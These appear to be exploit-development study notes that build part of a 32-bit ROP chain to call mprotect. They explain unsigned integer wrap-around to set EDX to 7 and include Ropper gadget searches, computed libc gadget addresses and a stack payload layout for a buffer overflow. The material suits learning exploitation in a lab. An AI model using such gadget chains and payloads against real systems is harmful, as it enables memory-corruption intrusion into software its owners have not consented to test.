# Using ROP chain to call mprotect with proper arguments:

* The goal here is to fill the stack with the addresses of gadgets, that we will use, in chain, to fill the registers used by mprotect() when it executes. I'll use the same values as those seen in the mprotect.md example. 

## First parameter setup in EDX

- We want to set a value into EDX, so at one point, we need to have this value on top of the stack, so we can `pop` it into EDX. We need to find a `pop edx;` gadget. But where to place it ?
-  So right after all those As we've filled the buffer with, we want to have the value of the gadget `pop edx; ret;` and just after it, the value we want to pop into EDX which is `0xffffffff`. 
- Why `0xffffffff` and not `0x7` ? Good question you ask ! The reason is sadistic, we could put `0x7` and pop it into EDX, but we let's talk about a concept i recently heard about: **Integer Overflow**
	- in 32 bits systems, the maximum value a number can have is `0xffffffff`. This number is called a *Unsigned integer*. 
	- Now, what happens when we add 1 to this value ? If we reach the maximum value already ... can we add 1 to it ? What happens then ? Yes we can: `0xffffffff + 1 = 0x100000000` ... but this is not 0 !
	- In a 32-bit system, only 32 bits are stored ... so where does this extra value goes ? Well, the value *wraps* around and becomes `0x00000000`. And this *action* is called an **unsigned integer overflow**: exceeding the maximum representable value causes a wrap-around to zero.
- So our goal, will be to add `1` eight times in a row, in order to go from `0xffffffff` to `0x7`, and to add `1` to EDX we will use a gadget that increments it. This gadget will be `inc edx; ret;`
- Both gadgets offset addresses (compared to the libc base address) can be found using Ropper:
```bash
(ropper)> file /usr/lib32/libc.so.6
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] File loaded.
(libc.so.6/ELF/x86)> search /1/ pop edx
[INFO] Searching for gadgets: pop edx
[INFO] File: /usr/lib32/libc.so.6
...
0x0003b4fc: pop edx; ret; 
(libc.so.6/ELF/x86)> search /1/ inc edx
...
0x000a07f8: inc edx; ret; 
```
- libc_base address = 0xf7d75000
- `pop edx; ret;` gadget offset = 0x0003b4fc
- `pop edx; ret;` global address = 0xf7d75000 +  0x0003b4fc = 0xF7DB04FC


|     STACK      ||
|----------------|-------------------------------|
|    A * 268     | => filling the buffer until rbp
| 0xF7DB04FC     | => `pop edx; ret` gadget will be placed on top of stack
| 0xffffffff     | => 0xffffffff will be placed on top of stack to be used by `pop edx`
|0xF7E157F8      | => `inc edx; ret` gadget, when it will be exec, EDX will contain 0 (ffffffff + 1 = 0)
|0xF7E157F8      | => goal is to keep incrementing until EDX contains 0x7
|0xF7E157F8      |
|0xF7E157F8      |
|0xF7E157F8      |
|0xF7E157F8      |
|0xF7E157F8      |
|0xF7E157F8      | => EDX now contains 7 aka `rwx`
